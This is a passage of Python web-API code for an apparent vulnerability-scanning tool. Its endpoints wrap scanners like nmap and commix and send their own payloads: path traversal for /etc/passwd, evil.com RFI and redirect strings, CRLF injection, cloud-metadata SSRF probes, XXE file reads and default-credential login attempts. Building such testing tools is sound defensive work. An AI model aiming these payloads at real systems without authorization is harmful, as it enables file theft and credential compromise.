            cves = info.get("classification",{}).get("cve-id") or []
            cwes = info.get("classification",{}).get("cwe-id") or []
            findings.append({"detail":info.get("name","Nuclei Finding")+(f" — {data.get('matched-at','')}" if data.get("matched-at") else ""),"severity":sev.upper(),"cvss":CVSS_MAP.get(sev,"0.0"),"cve":cves[0] if cves else "N/A","cwe":cwes[0] if cwes else "N/A","cwe_name":"Security Vulnerability","owasp":"A05:2021","remediation":info.get("remediation") or "Apply patch or update the affected component."})
        except: pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"nuclei",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nuclei","findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  ADDITIONAL SCAN ENDPOINTS (commix, lfi, csrf, idor, ssti)
# ══════════════════════════════════════════════════════════════

import requests as _req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@app.post("/api/scan/commix")
async def commix_scan(req: ScanRequest, user=Depends(verify_token)):
    cmd = ["commix","--url",_web_url(req.target),"--crawl=1","--batch","--level=1","--timeout=10","--output-dir=/tmp/commix_out"]
    result = await run_tool(cmd, timeout=180)
    out = result["output"].lower()
    vulnerable = ("is vulnerable" in out or "command injection" in out or "[+]" in result["output"] and "parameter" in out)
    findings = []
    if vulnerable:
        findings.append({"detail":"OS Command Injection vulnerability detected","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-78","cwe_name":"OS Command Injection","owasp":"A03:2021","remediation":"Never pass user input to OS commands. Use safe APIs and input validation."})
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"commix",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"commix","vulnerable":vulnerable,"findings":findings,"total":len(findings),"raw_output":result["output"],"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/lfi")
async def lfi_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    base = req.target.rstrip("/")
    indicators = ["root:x:","bin:x:","daemon:x:","[extensions]","for 16-bit","boot.ini"]

    # Generic path traversal — appended to base URL
    traversal = [
        "/../../../../etc/passwd",
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/....//....//....//etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/../../../../windows/win.ini",
    ]
    # App-specific vulnerable parameter endpoints
    param_endpoints = [
        "?page=../../../../etc/passwd",                              # Mutillidae / generic PHP
        "?file=../../../../etc/passwd",
        "?include=../../../../etc/passwd",
        "?view=../../../../etc/passwd",
        "/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd",     # DVWA (low security)
        "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "/mutillidae/index.php?page=../../../../etc/passwd",
    ]

    def _check(url):
        try:
            r = _req_lib.get(url, timeout=8, verify=False, allow_redirects=True)
            for ind in indicators:
                if ind in r.text:
                    return True
        except: pass
        return False

    for path in traversal:
        if _check(base + path):
            findings.append({"detail":f"LFI/Path Traversal confirmed — /etc/passwd readable via directory traversal","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Validate and sanitise all file path inputs. Use allowlists. Disable PHP allow_url_include."})
            break

    if not findings:
        for ep in param_endpoints:
            url = (base + ep) if ep.startswith("/") else (base + "/" + ep.lstrip("?") if not ep.startswith("?") else base + ep)
            if ep.startswith("?"):
                url = base + ep
            elif ep.startswith("/dvwa") or ep.startswith("/vulner") or ep.startswith("/mut"):
                url = base + ep
            if _check(url):
                findings.append({"detail":f"LFI confirmed via parameter — {ep.split('?')[0] if '?' in ep else ep}: /etc/passwd contents returned","severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-22","cwe_name":"Path Traversal","owasp":"A01:2021","remediation":"Never pass user-controlled filenames to include/require. Use allowlisted page mappings."})
                break

    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"lfi",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"lfi","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/csrf")
async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    try:
        r = _req_lib.get(_web_url(req.target),timeout=15,verify=False,headers=_BROWSER_HEADERS,allow_redirects=True)
        forms = re.findall(r"<form[^>]*?>.*?</form>",r.text,re.DOTALL|re.IGNORECASE)
        csrf_patterns = ["csrf","_token","token","authenticity_token","__requestverificationtoken","xsrf","nonce"]
        for i,form in enumerate(forms):
            has_csrf = any(p in form.lower() for p in csrf_patterns)
            m = re.search(r'method=["\'](\w+)["\']',form,re.IGNORECASE)
            method = m.group(1).upper() if m else "GET"
            am = re.search(r'action=["\']([^"\']*)["\']',form,re.IGNORECASE)
            action = am.group(1) if am else req.target
            if method in ("POST","PUT","DELETE") and not has_csrf:
                findings.append({"detail":f"CSRF: Form #{i+1} (action={action}) has no CSRF token","severity":"HIGH","cvss":"8.0","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add CSRF tokens to all state-changing forms."})
        if not r.headers.get("Referrer-Policy"):
            findings.append({"detail":"Missing Referrer-Policy header","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-352","cwe_name":"CSRF","owasp":"A01:2021","remediation":"Add Referrer-Policy: strict-origin-when-cross-origin header."})
    except Exception:
        pass
    scan_id = str(uuid.uuid4())
    save_scan(scan_id,"csrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"csrf","findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  MISSING WEB APP SCAN ENDPOINTS
# ══════════════════════════════════════════════════════════════

def _http_get(url, timeout=10, headers=None):
    h = dict(_BROWSER_HEADERS)
    if headers: h.update(headers)
    try: return _req_lib.get(url,timeout=timeout,verify=False,headers=h,allow_redirects=True)
    except: return None

@app.post("/api/scan/wafw00f")
async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["wafw00f", _web_url(req.target), "-a"], timeout=60)
    out = result.get("output","")
    detected = re.findall(r"is behind (.+?)(?:\n|$|WAF)", out, re.IGNORECASE)
    waf = detected[0].strip() if detected else None
    findings = [{"detail":f"WAF detected: {waf}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"WAF","owasp":"N/A","remediation":"WAF is a defensive control."}] if waf else []
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"wafw00f",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"wafw00f","waf":waf,"detected":bool(waf),"findings":findings,"output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/whatweb")
async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["whatweb","--color=never","--no-errors","--open-timeout","10","--read-timeout","10",_web_url(req.target)], timeout=30)
    out = result.get("output","")
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"whatweb",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"whatweb","output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/nmap")
async def scan_nmap(req: ScanRequest, user=Depends(verify_token)):
    host = req.target.replace("http://","").replace("https://","").split("/")[0]
    is_external = not any(x in host for x in ["lab_","localhost","127.","192.168.","10.","172."])
    timing = "-T2" if is_external else "-T4"
    ports  = "50"  if is_external else "100"
    result = await run_tool(["nmap","-sV",timing,"--open","--top-ports",ports,host], timeout=120)
    out = result.get("output","")
    ports = []
    for line in out.splitlines():
        m = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)", line.strip())
        if m: ports.append({"port":int(m.group(1)),"proto":m.group(2),"state":"open","service":m.group(3),"version":m.group(4).strip()})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"nmap",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"nmap","ports":ports,"total_open":len(ports),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/cors")
async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    try:
        r = _req_lib.get(_web_url(req.target),timeout=15,verify=False,headers={**_BROWSER_HEADERS,"Origin":"https://evil.com"},allow_redirects=True)
        acao = r.headers.get("Access-Control-Allow-Origin","")
        acac = r.headers.get("Access-Control-Allow-Credentials","")
        if acao in ("*","https://evil.com"):
            vulnerable = True
            findings.append({"detail":f"CORS: Access-Control-Allow-Origin: {acao}","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Restrict CORS to trusted origins only."})
        if acac.lower()=="true" and acao!="":
            vulnerable = True
            findings.append({"detail":"CORS: Credentials allowed with permissive origin","severity":"CRITICAL","cvss":"9.0","cve":"N/A","cwe":"CWE-942","cwe_name":"CORS Misconfiguration","owasp":"A05:2021","remediation":"Never combine Access-Control-Allow-Credentials: true with wildcard origins."})
    except Exception as e:
        findings.append({"detail":f"CORS scan error: {e}","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Scan Error","owasp":"N/A","remediation":"Check target."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"cors",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"cors","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/gobuster")
async def scan_gobuster(req: ScanRequest, user=Depends(verify_token)):
    result = await run_tool(["gobuster","dir","-u",_web_url(req.target),"-w","/usr/share/wordlists/dirb/common.txt","-t","20","--no-error","-q"], timeout=120)
    out = result.get("output","")
    discovered = [line.split()[0] for line in out.splitlines() if line.strip().startswith("/")]
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"gobuster",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"gobuster","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/subdomains")
async def scan_subdomains(req: ScanRequest, user=Depends(verify_token)):
    host = req.target.replace("http://","").replace("https://","").split("/")[0]
    result = await run_tool(["amass","enum","-passive","-d",host,"-timeout","2"], timeout=120)
    out = result.get("output","")
    subdomains = list(set(re.findall(r"[\w\-\.]+\."+re.escape(host), out)))
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"subdomains",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"subdomains","subdomains":subdomains,"total":len(subdomains),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/dns")
async def scan_dns(req: ScanRequest, user=Depends(verify_token)):
    host = req.target.replace("http://","").replace("https://","").split("/")[0]
    result = await run_tool(["dig","any",host,"+noall","+answer"], timeout=30)
    out = result.get("output","")
    records = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts)>=5 and not line.startswith(";"):
            rtype = parts[3]; val = " ".join(parts[4:])
            records.setdefault(rtype,[]).append(val)
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dns",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"dns","records":records,"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ffuf")
async def scan_ffuf(req: ScanRequest, user=Depends(verify_token)):
    url = _web_url(req.target).rstrip("/") + "/FUZZ"
    result = await run_tool(["ffuf","-u",url,"-w","/usr/share/wordlists/dirb/common.txt","-mc","200,201,301,302,403","-t","20","-s"], timeout=120)
    out = result.get("output","")
    discovered = [line.strip() for line in out.splitlines() if line.strip() and not line.startswith("[")]
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ffuf",req.target,result)
    return {"scan_id":scan_id,"target":req.target,"tool":"ffuf","discovered":discovered,"total":len(discovered),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/rfi")
async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    test_payloads = ["?page=http://evil.com/shell.txt","?file=http://evil.com/","?include=http://evil.com/","?url=http://evil.com/"]
    for p in test_payloads[:2]:
        r = _http_get(req.target+p, timeout=8)
        if r and ("evil.com" in r.text or r.status_code==200 and len(r.text)>100):
            findings.append({"detail":f"Potential RFI via param: {p}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-98","cwe_name":"Remote File Inclusion","owasp":"A03:2021","remediation":"Disable allow_url_include in PHP. Validate all file path inputs."})
            vulnerable = True; break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"rfi",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"rfi","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/deserial")
async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    r = _http_get(req.target, timeout=10)
    if r:
        ct = r.headers.get("Content-Type","")
        if "java" in ct.lower() or "application/x-java-serialized-object" in ct.lower():
            findings.append({"detail":"Java serialization content-type detected","severity":"HIGH","cvss":"8.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Avoid deserializing untrusted data. Use safe parsers."})
        cookies = r.headers.get("Set-Cookie","")
        if "serialize" in cookies.lower() or "base64" in cookies.lower() or "rO0" in cookies:
            findings.append({"detail":"Possible serialized object in cookie","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Sign and validate all serialized session data."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"deserial",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/smuggling")
async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
    findings = []
    # Send TE.CL ambiguous request and look for server confusion (501/400 NOT present = server accepts both headers)
    # Also check if server responds with different status when TE conflicts
    result1 = await run_tool(["curl","-s","-I","--http1.1","-H","Transfer-Encoding: chunked","-H","Content-Length: 6","--max-time","8",req.target], timeout=15)
    result2 = await run_tool(["curl","-s","-I","--http1.1","--max-time","8",req.target], timeout=15)
    out1 = result1.get("output",""); out2 = result2.get("output","")
    def _status(out): m=re.search(r"HTTP/[\d.]+ (\d+)",out); return m.group(1) if m else "0"
    s1,s2 = _status(out1), _status(out2)
    # Only report if the ambiguous request causes a materially different response (e.g. 200 vs 400/500)
    if s1 and s2 and s1!=s2 and s1 not in ("0","") and s2 not in ("0",""):
        if (s1.startswith("4") or s1.startswith("5")) and s2=="200":
            findings.append({"detail":f"HTTP Request Smuggling: server responds differently to TE+CL conflict ({s2} normal vs {s1} with conflicting headers)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-444","cwe_name":"HTTP Request Smuggling","owasp":"A02:2021","remediation":"Enforce HTTP/2 end-to-end. Configure server to reject requests with both Transfer-Encoding and Content-Length headers."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"smuggling",req.target,{"output":out1})
    return {"scan_id":scan_id,"target":req.target,"tool":"smuggling","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/responsesplitting")
async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    test = req.target + "?q=%0d%0aSet-Cookie:injected=1"
    r = _http_get(test, timeout=10)
    if r and "injected" in str(r.headers):
        vulnerable = True
        findings.append({"detail":"HTTP Response Splitting via CRLF injection","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-113","cwe_name":"HTTP Response Splitting","owasp":"A03:2021","remediation":"Strip CR/LF from all user-controlled values used in headers."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"responsesplitting",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"responsesplitting","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/sessionfixation")
async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    r = _http_get(req.target, timeout=10)
    if r:
        sc = r.headers.get("Set-Cookie","")
        if "httponly" not in sc.lower():
            findings.append({"detail":"Session cookie missing HttpOnly flag","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Set HttpOnly and Secure flags on all session cookies."})
            vulnerable = True
        if "samesite" not in sc.lower():
            findings.append({"detail":"Session cookie missing SameSite attribute","severity":"LOW","cvss":"3.5","cve":"N/A","cwe":"CWE-384","cwe_name":"Session Fixation","owasp":"A07:2021","remediation":"Add SameSite=Strict or SameSite=Lax to session cookies."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sessionfixation",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"sessionfixation","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/openredirect")
async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    payloads = ["?url=https://evil.com","?redirect=https://evil.com","?next=https://evil.com","?return=https://evil.com","?to=https://evil.com"]
    for p in payloads:
        try:
            r = _req_lib.get(_web_url(req.target)+p,timeout=10,verify=False,headers=_BROWSER_HEADERS,allow_redirects=False)
            loc = r.headers.get("Location","")
            if "evil.com" in loc:
                vulnerable = True
                findings.append({"detail":f"Open Redirect via {p} -> {loc}","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-601","cwe_name":"Open Redirect","owasp":"A01:2021","remediation":"Whitelist allowed redirect destinations. Never redirect to user-supplied URLs."})
                break
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"openredirect",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"openredirect","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/sensitivefiles")
async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
    findings = []; base = req.target.rstrip("/")
    is_spa = _detect_spa(req.target)
    baseline_size = None
    try:
        br = _http_get(base + "/", timeout=6)
        if br and br.status_code == 200: baseline_size = len(br.content)
    except: pass
    paths = [
        ".env","config.php","wp-config.php",".git/HEAD","backup.zip","db.sql",
        "admin/","phpinfo.php",".htpasswd","web.config","server-status",
        "robots.txt","sitemap.xml",".well-known/security.txt",
        "crossdomain.xml","test.php","info.php","debug.php","status","healthz",
        "dvwa/","dvwa/login.php","setup.php","instructions.php","dvwa/phpinfo.php",
        "WebGoat/","WebGoat/login","WebGoat/registration",
        "mutillidae/","mutillidae/index.php","mutillidae/set-up-database.php",
        "bWAPP/","bWAPP/login.php","bWAPP/install.php","bWAPP/admin/",
        "config/database.php","includes/config.php",".DS_Store",".svn/entries",
        "ftp/","backup/","old/","temp/","tmp/",
    ]
    high_risk = [".env","config.php","wp-config",".git","backup","db.sql",".htpasswd","web.config","install.php","set-up-database","database.php","phpinfo"]
    for p in paths:
        r = _http_get(f"{base}/{p.lstrip('/')}", timeout=6)
        if not r: continue
        if r.status_code == 403:
            # 403 = access denied = resource exists — always a real finding
            sev = "HIGH" if any(x in p for x in high_risk) else "MEDIUM"
            findings.append({"detail":f"/{p} exists but access is denied (HTTP 403) — resource is present on server","severity":sev,"cvss":"5.3","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Remove /{p} from the web root entirely."})
        elif r.status_code == 200:
            ct = r.headers.get("Content-Type","").lower()
            # Skip if response size matches homepage baseline (SPA returning index.html for unknown paths)
            if baseline_size and len(r.content) == baseline_size and "text/html" in ct: continue
            # Skip if SPA returned its own HTML index page for this path
            if is_spa and "text/html" in ct: continue
            # Skip if the response is just a redirect/login page (very short HTML)
            if "text/html" in ct and len(r.text) < 200 and p not in ("robots.txt","sitemap.xml"): continue
            sev = "HIGH" if any(x in p for x in high_risk) else "LOW"
            findings.append({"detail":f"Accessible: /{p} (HTTP 200, {len(r.content)} bytes) — {'sensitive file/configuration exposed' if sev=='HIGH' else 'file or directory is publicly accessible'}","severity":sev,"cvss":"7.5" if sev=="HIGH" else "3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"Sensitive File Exposure","owasp":"A05:2021","remediation":f"Block public access to /{p}. Remove install/setup/backup files after deployment."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"sensitivefiles",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"sensitivefiles","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/hydra")
async def scan_hydra(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    if _is_external(req.target):
        scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":"skipped-external"})
        return {"scan_id":scan_id,"target":req.target,"tool":"hydra","vulnerable":False,"findings":[],"total":0,"skipped":True,"reason":"Use Password Attacks module for external targets","timestamp":datetime.datetime.utcnow().isoformat()}
    base = req.target.rstrip("/")
    # Try multiple known login paths for different lab apps
    login_paths = [
        "/login", "/login.php", "/index.php",
        "/dvwa/login.php",                        # DVWA
        "/bWAPP/login.php",                       # bWAPP
        "/mutillidae/index.php",                  # Mutillidae
        "/WebGoat/login",                         # WebGoat
        "/admin", "/admin/login", "/wp-login.php",
    ]
    # Pairs matching known lab defaults first
    weak_creds = [
        ("admin","password"),    # DVWA default
        ("admin","adminpass"),   # Mutillidae default
        ("bee","bug"),           # bWAPP default
        ("admin","admin"),
        ("admin","123456"),
        ("root","root"),
        ("test","test"),
        ("guest","guest"),
    ]
    success_indicators = ["logout","sign out","dashboard","welcome","logged in","my account","your profile","home"]
    for login_path in login_paths:
        login_url = base + login_path
        for u, p in weak_creds:
            try:
                r = _req_lib.post(login_url, data={"username":u,"password":p,"user":u,"pass":p,"Login":"Login","login":"login"}, timeout=8, verify=False, allow_redirects=True)
                if r.status_code in (200,302) and any(x in r.text.lower() for x in success_indicators):
                    vulnerable = True
                    findings.append({"detail":f"Weak default credentials accepted — {u}/{p} logs in at {login_path}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-521","cwe_name":"Weak/Default Password","owasp":"A07:2021","remediation":"Change all default credentials immediately. Enforce password complexity and account lockout after failed attempts."})
                    break
            except: pass
        if vulnerable: break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"hydra","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ssrf")
async def scan_ssrf(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    # Top SSRF parameter names (most commonly exploited)
    params = ["url","redirect","proxy","fetch","dest","src","host","endpoint","callback","next",
              "target","path","uri","return","returnUrl","load","page","link","ref","img"]
    # Internal/cloud metadata targets
    internal_targets = [
        ("http://169.254.169.254/latest/meta-data/",          ["ami-id","instance-id","local-ipv4","security-credentials"], "AWS EC2 metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/",["project-id","instance","serviceAccounts"],                 "GCP metadata"),
        ("http://169.254.169.254/metadata/instance",          ["compute","network","subscriptionId"],                       "Azure metadata"),
        ("http://127.0.0.1/",                                 ["html","body","localhost","apache","nginx","iis"],            "Localhost access"),
        ("http://localhost:8080/",                             ["html","body","tomcat","jetty","spring"],                    "Internal service :8080"),
    ]
    ssrf_headers = {**_BROWSER_HEADERS, "X-Forwarded-For":"127.0.0.1"}
    for param in params:
        for (internal_url, indicators, label) in internal_targets:
            test_url = f"{base}?{param}={internal_url}"
            try:
                r = _req_lib.get(test_url, timeout=3, verify=False, headers=ssrf_headers, allow_redirects=True)
                if r.status_code == 200 and any(ind.lower() in r.text.lower() for ind in indicators):
                    vulnerable = True
                    findings.append({
                        "detail": f"SSRF via parameter '{param}' — {label} accessible ({internal_url})",
                        "severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-918",
                        "cwe_name":"Server-Side Request Forgery","owasp":"A10:2021",
                        "remediation":"Implement URL allowlist. Block RFC-1918 private IPs and cloud metadata ranges. Reject redirects to internal addresses."
                    })
                    break
            except: pass
            if vulnerable: break
        if vulnerable: break
    # Blind SSRF: check for open redirect that reaches internal (response time / redirect location)
    for param in ["url","redirect","next","return","callback"]:
        test_url = f"{base}?{param}=http://169.254.169.254/"
        try:
            r = _req_lib.get(test_url, timeout=3, verify=False, headers=ssrf_headers, allow_redirects=False)
            loc = r.headers.get("Location","")
            if "169.254" in loc or "127.0.0.1" in loc or "localhost" in loc:
                findings.append({
                    "detail": f"Blind SSRF / Open Redirect via '{param}' — redirects to internal address: {loc}",
                    "severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-918",
                    "cwe_name":"Blind SSRF","owasp":"A10:2021",
                    "remediation":"Validate redirect destinations. Never follow redirects to private/internal IP ranges."
                })
                vulnerable = True
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"ssrf","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xxe")
async def scan_xxe(req: ScanRequest, user=Depends(verify_token)):
    findings = []; vulnerable = False
    url = _web_url(req.target)
    headers_xml  = {"Content-Type":"application/xml","User-Agent":"Mozilla/5.0","Accept":"application/xml,text/xml,*/*"}
    headers_soap = {"Content-Type":"text/xml; charset=utf-8","SOAPAction":"test","User-Agent":"Mozilla/5.0"}
    # Multiple XXE payloads covering different parsers and content types
    payloads = [
        # Classic file read — Linux
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         headers_xml, ["root:x","nobody:x","daemon:x"], "Classic XXE — /etc/passwd read (Linux)"),
        # Windows file read
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
         headers_xml, ["[fonts]","[extensions]","for 16-bit"], "Classic XXE — win.ini read (Windows)"),
        # SOAP-based XXE (web services)
        ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>',
         headers_soap, ["root:x","nobody:x"], "SOAP XXE — /etc/passwd via SOAP envelope"),
        # Parameter entity XXE
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
         headers_xml, ["root:x","nobody:x"], "Parameter entity XXE"),
        # XXE via UTF-16 encoding bypass
        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         {**headers_xml,"Content-Type":"application/xml; charset=UTF-16"}, ["root:x","nobody:x"], "UTF-16 encoded XXE bypass"),
        # /etc/hosts read (less sensitive but confirms XXE)
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
         headers_xml, ["localhost","127.0.0.1","::1"], "XXE — /etc/hosts read"),
        # /proc/self/environ — env var leakage
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
         headers_xml, ["PATH=","HOME=","USER=","PWD="], "XXE — /proc/self/environ env var leak"),
    ]
    for (payload, hdrs, indicators, label) in payloads:
        try:
            r = _req_lib.post(url, data=payload, timeout=10, verify=False, headers=hdrs)
            if any(ind in r.text for ind in indicators):
                vulnerable = True
                findings.append({
                    "detail": f"XXE confirmed: {label}",
                    "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
                    "cwe_name":"XXE Injection","owasp":"A05:2021",
                    "remediation":"Disable external entity processing. Set FEATURE_EXTERNAL_GENERAL_ENTITIES to false. Use JSON APIs where possible."
                })
        except: pass
    # Also test JSON endpoint that might parse XML internally
    try:
        r = _req_lib.post(url, data='{"data":"<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}',
                          timeout=8, verify=False, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
        if "root:x" in r.text or "nobody:x" in r.text:
            vulnerable = True
            findings.append({
                "detail":"XXE via JSON body — backend parses XML inside JSON value",
                "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
                "cwe_name":"XXE via JSON","owasp":"A05:2021",
                "remediation":"Sanitize all input before passing to XML parsers. Never parse user-supplied XML from JSON fields."
            })
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"xxe",req.target,{"output":str(findings)})
